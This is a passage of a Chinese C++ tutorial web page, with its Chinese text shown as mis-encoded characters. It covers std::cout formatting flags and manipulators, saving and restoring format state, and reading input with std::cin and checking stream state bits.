(ç²¾åº¦5è¡¨ç¤ºå°æ•°ä½æ•°)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::scientific; <span class="comment">// è®¾ç½®ä¸ºç§‘å­¦è®¡æ•°æ³•æ ¼å¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Scientific format:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; num2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1.23457e+041.23450e-05 (ç²¾åº¦5è¡¨ç¤ºå°æ•°ä½æ•°)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¢å¤é»˜è®¤æ ¼å¼ (éœ€è¦æ¸…é™¤ floatfield)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.unsetf(<span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Back to default format:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; num2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 123461.2345e-05</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-å…¶ä»–æ ¼å¼æ ‡å¿—å’Œæ“çºµç¬¦"><a href="#6-å…¶ä»–æ ¼å¼æ ‡å¿—å’Œæ“çºµç¬¦" class="headerlink" title="6. å…¶ä»–æ ¼å¼æ ‡å¿—å’Œæ“çºµç¬¦"></a>6. å…¶ä»–æ ¼å¼æ ‡å¿—å’Œæ“çºµç¬¦</h4><ul><li><p><strong>å¯¹é½æ–¹å¼ (<code>left</code>, <code>right</code>, <code>internal</code>):</strong></p><ul><li><p>  <code>left</code>: åœ¨å­—æ®µå†…å·¦å¯¹é½è¾“å‡ºï¼Œå¡«å……å­—ç¬¦æ”¾åœ¨å³è¾¹ã€‚</p></li><li><p>  <code>right</code>: åœ¨å­—æ®µå†…å³å¯¹é½è¾“å‡ºï¼Œå¡«å……å­—ç¬¦æ”¾åœ¨å·¦è¾¹ï¼ˆé»˜è®¤ï¼‰ã€‚</p></li><li><p>  <code>internal</code>: ç¬¦å·ï¼ˆæ­£è´Ÿå·æˆ–åŸºæ•°å‰ç¼€ï¼‰å·¦å¯¹é½ï¼Œæ•°å€¼å³å¯¹é½ï¼Œå¡«å……å­—ç¬¦æ”¾åœ¨ä¸­é—´ã€‚</p></li><li><p>å¯ä»¥é€šè¿‡ <code>setf()</code> è®¾ç½® <code>ios_base::left</code>, <code>ios_base::right</code>, <code>ios_base::internal</code> æ ‡å¿—ï¼Œæˆ–ä½¿ç”¨åŒåæ“çºµç¬¦ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">10</span>) &lt;&lt; <span class="built_in">std</span>::left &lt;&lt; <span class="string">&quot;Hi&quot;</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;  <span class="comment">// è¾“å‡º *Hi        *</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">10</span>) &lt;&lt; <span class="built_in">std</span>::right &lt;&lt; <span class="number">-12</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º *       -12*</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">10</span>) &lt;&lt; <span class="built_in">std</span>::internal &lt;&lt; <span class="number">-12</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º *-       12*</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::right; <span class="comment">// æ¢å¤é»˜è®¤å³å¯¹é½</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>æ˜¾ç¤ºå°æ•°ç‚¹ (<code>showpoint</code>, <code>noshowpoint</code>):</strong></p><ul><li><p>  <code>showpoint</code>: å¼ºåˆ¶æ˜¾ç¤ºæµ®ç‚¹æ•°çš„å°æ•°ç‚¹å’Œæœ«å°¾çš„é›¶ï¼ˆå³ä½¿å°æ•°éƒ¨åˆ†ä¸ºé›¶ï¼‰ã€‚</p></li><li><p><code>noshowpoint</code>: ä¸å¼ºåˆ¶æ˜¾ç¤ºï¼ˆé»˜è®¤ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default: &quot;</span> &lt;&lt; <span class="number">12.0</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å¯èƒ½è¾“å‡º 12 (å–å†³äºå®ç°)</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::showpoint;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Showpoint: &quot;</span> &lt;&lt; <span class="number">12.0</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 12.00</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::noshowpoint;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>æ˜¾ç¤ºæ­£å· (<code>showpos</code>, <code>noshowpos</code>):</strong></p><ul><li><p>  <code>showpos</code>: å¯¹äºéè´Ÿæ•°ï¼Œåœ¨å‰é¢æ˜¾ç¤º <code>+</code> å·ã€‚</p></li><li><p><code>noshowpos</code>: ä¸æ˜¾ç¤ºæ­£å·ï¼ˆé»˜è®¤ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; +<span class="number">10</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="number">-10</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 10 -10</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::showpos;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; +<span class="number">10</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="number">-10</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º +10 -10</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::noshowpos;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>å¸ƒå°”å€¼æ ¼å¼ (<code>boolalpha</code>, <code>noboolalpha</code>):</strong></p><ul><li><p>  <code>boolalpha</code>: å°† <code>bool</code> å€¼è¾“å‡ºä¸ºå­—ç¬¦ä¸² â€œtrueâ€ æˆ– â€œfalseâ€ã€‚</p></li><li><p><code>noboolalpha</code>: å°† <code>bool</code> å€¼è¾“å‡ºä¸ºæ•´æ•° 1 æˆ– 0ï¼ˆé»˜è®¤ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default bool: &quot;</span> &lt;&lt; flag &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::boolalpha;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Boolalpha: &quot;</span> &lt;&lt; flag &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º true</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::noboolalpha;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="7-è®¾ç½®æ ¼å¼-setf"><a href="#7-è®¾ç½®æ ¼å¼-setf" class="headerlink" title="7. è®¾ç½®æ ¼å¼ (setf())"></a>7. è®¾ç½®æ ¼å¼ (<code>setf()</code>)</h4><p><code>setf()</code> æ˜¯ä¸€ä¸ªæ›´åº•å±‚çš„è®¾ç½®æ ¼å¼æ ‡å¿—çš„æ–¹æ³•ã€‚å®ƒæœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼š</p><ul><li>  <code>fmtflags setf(fmtflags flags)</code>: è®¾ç½® <code>flags</code> ä¸­æŒ‡å®šçš„ä½ã€‚ä¾‹å¦‚ <code>cout.setf(ios_base::showpos)</code>ã€‚</li><li>  <code>fmtflags setf(fmtflags flags, fmtflags mask)</code>: å…ˆæ¸…é™¤ <code>mask</code> ä¸­æŒ‡å®šçš„ä½ï¼Œç„¶åè®¾ç½® <code>flags</code> ä¸­æŒ‡å®šçš„ä½ã€‚è¿™ç”¨äºè®¾ç½®äº’æ–¥çš„æ ‡å¿—ç»„ï¼Œå¦‚å¯¹é½æ–¹å¼ (<code>adjustfield</code>) æˆ–æµ®ç‚¹æ•°æ ¼å¼ (<code>floatfield</code>)ã€‚ä¾‹å¦‚ <code>cout.setf(ios_base::left, ios_base::adjustfield)</code>ã€‚</li></ul><p>è™½ç„¶ <code>setf()</code> æä¾›äº†å®Œå…¨çš„æ§åˆ¶ï¼Œä½†ä½¿ç”¨æ“çºµç¬¦é€šå¸¸æ›´æ˜“è¯»ã€æ›´æ–¹ä¾¿ã€‚</p><p><strong>ä¿å­˜å’Œæ¢å¤æ ¼å¼çŠ¶æ€:</strong> æœ‰æ—¶ä½ å¯èƒ½æƒ³ä¸´æ—¶æ”¹å˜æ ¼å¼ï¼Œä¹‹åå†æ¢å¤ã€‚å¯ä»¥ä¿å­˜ <code>flags()</code> å’Œ <code>precision()</code> çš„å€¼ï¼Œä¹‹åå†ç”¨ <code>flags(old_flags)</code> å’Œ <code>precision(old_precision)</code> æ¢å¤ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä¿å­˜å½“å‰æ ¼å¼çŠ¶æ€</span></span><br><span class="line">    <span class="built_in">std</span>::ios_base::fmtflags original_flags = <span class="built_in">std</span>::<span class="built_in">cout</span>.flags();</span><br><span class="line">    <span class="built_in">std</span>::streamsize original_precision = <span class="built_in">std</span>::<span class="built_in">cout</span>.precision();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿›è¡Œä¸€äº›æ ¼å¼åŒ–è¾“å‡º</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">std</span>::showpos;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Formatted: &quot;</span> &lt;&lt; <span class="number">12.345</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="number">-6.7</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¢å¤åŸå§‹æ ¼å¼çŠ¶æ€</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.flags(original_flags);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(original_precision);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Restored: &quot;</span> &lt;&lt; <span class="number">12.345</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="number">-6.7</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç»„åˆä½¿ç”¨è¿™äº›æ ¼å¼åŒ–å·¥å…·ï¼Œå¯ä»¥ç²¾ç¡®åœ°æ§åˆ¶ <code>cout</code> è¾“å‡ºæ•°æ®çš„å¤–è§‚ã€‚</p><h2 id="17-3-ä½¿ç”¨-cin-è¿›è¡Œè¾“å…¥"><a href="#17-3-ä½¿ç”¨-cin-è¿›è¡Œè¾“å…¥" class="headerlink" title="17.3 ä½¿ç”¨ cin è¿›è¡Œè¾“å…¥"></a>17.3 ä½¿ç”¨ cin è¿›è¡Œè¾“å…¥</h2><p><code>std::cin</code> æ˜¯ C++ æ ‡å‡†åº“ <code>&lt;iostream&gt;</code> ä¸­é¢„å®šä¹‰çš„ä¸€ä¸ª <code>istream</code> ç±»çš„å…¨å±€å¯¹è±¡ï¼Œé€šå¸¸è¿æ¥åˆ°æ ‡å‡†è¾“å…¥è®¾å¤‡ï¼ˆå¦‚é”®ç›˜ï¼‰ã€‚å®ƒæ˜¯ C++ ä¸­è·å–ç”¨æˆ·è¾“å…¥çš„ä¸»è¦æ–¹å¼ã€‚</p><p><code>cin</code> æœ€å¸¸è§çš„ç”¨æ³•æ˜¯é…åˆ<strong>æå–è¿ç®—ç¬¦ (<code>&gt;&gt;</code>)</strong> ä½¿ç”¨ã€‚è¿™ä¸ªè¿ç®—ç¬¦ä¹Ÿè¢«é‡è½½ä»¥æ¥å—å„ç§åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆ<code>int</code>, <code>float</code>, <code>double</code>, <code>char</code> ç­‰ï¼‰ä»¥åŠ <code>std::string</code> å’Œ C é£æ ¼å­—ç¬¦æ•°ç»„ã€‚</p><p><strong><code>cin &gt;&gt;</code> çš„å·¥ä½œæ–¹å¼:</strong></p><ol><li> <strong>è·³è¿‡ç©ºç™½:</strong> <code>&gt;&gt;</code> è¿ç®—ç¬¦é»˜è®¤ä¼š<strong>è·³è¿‡</strong>è¾“å…¥æµä¸­æ‰€æœ‰å‰å¯¼çš„<strong>ç©ºç™½å­—ç¬¦</strong>ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰ã€‚</li><li> <strong>è¯»å–å’Œè½¬æ¢:</strong> å®ƒä¼šæ ¹æ®ç›®æ ‡å˜é‡çš„ç±»å‹ï¼Œä»ç¼“å†²åŒºè¯»å–éç©ºç™½å­—ç¬¦ï¼Œå¹¶å°è¯•å°†è¿™äº›å­—ç¬¦è½¬æ¢ä¸ºç›®æ ‡ç±»å‹çš„å€¼ã€‚</li><li> <strong>åœæ­¢è¯»å–:</strong> è¯»å–ä¼šåœ¨é‡åˆ°<strong>ä¸é€‚åˆ</strong>ç›®æ ‡ç±»å‹çš„å­—ç¬¦ï¼ˆä¾‹å¦‚ï¼Œè¯»å– <code>int</code> æ—¶é‡åˆ°å­—æ¯ï¼‰æˆ–ä¸‹ä¸€ä¸ª<strong>ç©ºç™½å­—ç¬¦</strong>æ—¶åœæ­¢ã€‚</li><li> <strong>å­˜å‚¨å€¼:</strong> æˆåŠŸè½¬æ¢çš„å€¼è¢«å­˜å‚¨åœ¨ç›®æ ‡å˜é‡ä¸­ã€‚</li><li> <strong>ç•™ä¸‹åˆ†éš”ç¬¦:</strong> å¯¼è‡´è¯»å–åœæ­¢çš„é‚£ä¸ªä¸åˆé€‚çš„å­—ç¬¦æˆ–ç©ºç™½å­—ç¬¦ä¼š<strong>ç•™åœ¨</strong>è¾“å…¥ç¼“å†²åŒºä¸­ï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡è¯»å–ã€‚</li></ol><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">char</span> initial;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter age, price, initial, and name (separated by spaces): &quot;</span>;</span><br><span class="line">    <span class="comment">// Example input: 30 99.99 J Doe</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age &gt;&gt; price &gt;&gt; initial &gt;&gt; name; <span class="comment">// å¯ä»¥é“¾æ¥è¯»å–</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- You entered ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// Output: 30</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price: &quot;</span> &lt;&lt; price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// Output: 99.99</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial: &quot;</span> &lt;&lt; initial &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// Output: J</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// Output: Doe (åªè¯»å–åˆ°ç©ºæ ¼å‰)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ­¤æ—¶ï¼Œè¾“å…¥ç¼“å†²åŒºä¸­å¯èƒ½è¿˜ç•™æœ‰ &quot; Doe&quot; åé¢çš„æ¢è¡Œç¬¦</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-3-1-cin-gt-gt-å¦‚ä½•æ£€æŸ¥è¾“å…¥"><a href="#17-3-1-cin-gt-gt-å¦‚ä½•æ£€æŸ¥è¾“å…¥" class="headerlink" title="17.3.1 cin &gt;&gt; å¦‚ä½•æ£€æŸ¥è¾“å…¥"></a>17.3.1 cin &gt;&gt; å¦‚ä½•æ£€æŸ¥è¾“å…¥</h3><p><code>cin &gt;&gt;</code> è¡¨è¾¾å¼æœ¬èº«ä¼šè¿”å› <code>cin</code> å¯¹è±¡ (<code>istream&amp;</code>)ã€‚C++ å…è®¸åœ¨éœ€è¦å¸ƒå°”å€¼çš„åœ°æ–¹ï¼ˆå¦‚ <code>if</code> æˆ– <code>while</code> æ¡ä»¶ï¼‰ä½¿ç”¨æµå¯¹è±¡ã€‚å½“æµå¯¹è±¡è¢«ç”¨ä½œæ¡ä»¶æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥æµçš„**çŠ¶æ€ (state)**ã€‚å¦‚æœæµå¤„äºâ€œè‰¯å¥½â€çŠ¶æ€ï¼ˆæ²¡æœ‰å‘ç”Ÿé”™è¯¯ï¼‰ï¼Œæ¡ä»¶ä¸º <code>true</code>ï¼›å¦‚æœæµå‘ç”Ÿé”™è¯¯ï¼ˆå¦‚è¯»å–å¤±è´¥ã€åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼‰ï¼Œæ¡ä»¶ä¸º <code>false</code>ã€‚</p><p>è¿™ä½¿å¾—å¯ä»¥ç¼–å†™å¦‚ä¸‹å¾ªç¯ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter numbers (non-number to quit): &quot;</span>;</span><br><span class="line">    <span class="comment">// å½“ cin &gt;&gt; value æˆåŠŸè¯»å–ä¸€ä¸ªæ•´æ•°æ—¶ï¼Œcin çŠ¶æ€è‰¯å¥½ï¼Œå¾ªç¯ç»§ç»­</span></span><br><span class="line">    <span class="comment">// å½“è¾“å…¥éæ•°å­—å¯¼è‡´è¯»å–å¤±è´¥æ—¶ï¼Œcin è¿›å…¥ fail çŠ¶æ€ï¼Œå¾ªç¯ç»ˆæ­¢</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; value) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter next number: &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Input terminated or failed.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-3-2-æµçŠ¶æ€"><a href="#17-3-2-æµçŠ¶æ€" class="headerlink" title="17.3.2 æµçŠ¶æ€"></a>17.3.2 æµçŠ¶æ€</h3><p><code>istream</code> ç±»ï¼ˆä»¥åŠ <code>ostream</code> å’Œ <code>ios</code>ï¼‰å†…éƒ¨ç»´æŠ¤ä¸€ç»„<strong>çŠ¶æ€ä½ (state flags)</strong> æ¥è¡¨ç¤ºæµçš„å½“å‰çŠ¶æ€ã€‚è¿™äº›çŠ¶æ€ä½å®šä¹‰åœ¨ <code>ios_base</code> ç±»ä¸­ï¼Œç±»å‹ä¸º <code>iostate</code> (ä¸€ç§ä½æ©ç ç±»å‹)ã€‚</p><p>ä¸»è¦çš„çŠ¶æ€ä½æœ‰ï¼š</p><ul><li>  <strong><code>goodbit</code>:</strong> è¡¨ç¤ºæµå¤„äºæ­£å¸¸çŠ¶æ€ï¼Œæ²¡æœ‰å‘ç”Ÿé”™è¯¯ã€‚å€¼ä¸º 0ã€‚</li><li>  <strong><code>eofbit</code>:</strong> è¡¨ç¤ºå·²åˆ°è¾¾è¾“å…¥æµçš„**æœ«å°¾ (End Of File)**ã€‚å½“å°è¯•ä»æ–‡ä»¶æœ«å°¾æˆ–å…³é—­çš„è¾“å…¥æµè¯»å–æ—¶è®¾ç½®ã€‚</li><li>  <strong><code>failbit</code>:</strong> è¡¨ç¤ºå‘ç”Ÿ<strong>å¯æ¢å¤</strong>çš„æ ¼å¼é”™è¯¯ã€‚é€šå¸¸æ˜¯å› ä¸ºè¾“å…¥çš„æ•°æ®æ ¼å¼ä¸æœŸæœ›è¯»å–çš„ç±»å‹ä¸åŒ¹é…ï¼ˆä¾‹å¦‚ï¼ŒæœŸæœ› <code>int</code> ä½†è¾“å…¥äº†å­—æ¯ï¼‰ã€‚è®¾ç½® <code>failbit</code> åï¼Œåç»­çš„ I/O æ“ä½œé€šå¸¸ä¼šå¤±è´¥ï¼Œç›´åˆ°æµçŠ¶æ€è¢«æ¸…é™¤ã€‚</li><li>  <strong><code>badbit</code>:</strong> è¡¨ç¤ºå‘ç”Ÿ<strong>ä¸å¯æ¢å¤</strong>çš„ä¸¥é‡é”™è¯¯ï¼Œå¯èƒ½æ¶‰åŠæµæœ¬èº«çš„æŸåæˆ–åº•å±‚ I/O æ“ä½œå¤±è´¥ï¼ˆä¾‹å¦‚ï¼Œè¯»å–ç£ç›˜æ—¶å‘ç”Ÿç¡¬ä»¶é”™è¯¯ï¼‰ã€‚</li></ul><p>ä¸€ä¸ªæµå¯èƒ½åŒæ—¶è®¾ç½®äº†å¤šä¸ªçŠ¶æ€ä½ï¼ˆä¾‹å¦‚ï¼Œåœ¨æ–‡ä»¶æœ«å°¾å°è¯•è¯»å–å¤±è´¥å¯èƒ½åŒæ—¶è®¾ç½® <code>eofbit</code> å’Œ <code>failbit</code>ï¼‰ã€‚</p><p><strong>æ£€æŸ¥æµçŠ¶æ€çš„æˆå‘˜å‡½æ•°:</strong></p><ul><li>  <strong><code>good()</code>:</strong> å¦‚æœæµçŠ¶æ€ä¸º <code>goodbit</code>ï¼ˆå³æ‰€æœ‰é”™è¯¯ä½éƒ½æœªè®¾ç½®ï¼‰ï¼Œè¿”å› <code>true</code>ã€‚</li><li>  <strong><code>eof()</code>:</strong> å¦‚æœè®¾ç½®äº† <code>eofbit</code>ï¼Œè¿”å› <code>true</code>ã€‚</li><li>  <strong><code>fail()</code>:</strong> å¦‚æœè®¾ç½®äº† <code>failbit</code> <strong>æˆ–</strong> <code>badbit</code>ï¼Œè¿”å› <code>true</code>ã€‚è¿™æ˜¯æ£€æŸ¥è¯»å–æ“ä½œæ˜¯å¦å¤±è´¥çš„æœ€å¸¸ç”¨æ–¹æ³•ã€‚</li><li>  <strong><code>bad()</code>:</strong> å¦‚æœè®¾ç½®äº† <code>badbit</code>ï¼Œè¿”å› <code>true</code>ã€‚</li><li>  <strong><code>rdstate()</code>:</strong> è¿”å›å½“å‰æ‰€æœ‰çŠ¶æ€ä½çš„ç»„åˆï¼ˆä¸€ä¸ª <code>iostate</code> å€¼ï¼‰ã€‚</li><li>  <strong><code>operator bool()</code>:</strong> é‡è½½çš„å¸ƒå°”è½¬æ¢è¿ç®—ç¬¦ã€‚å¦‚æœ <code>fail()</code> è¿”å› 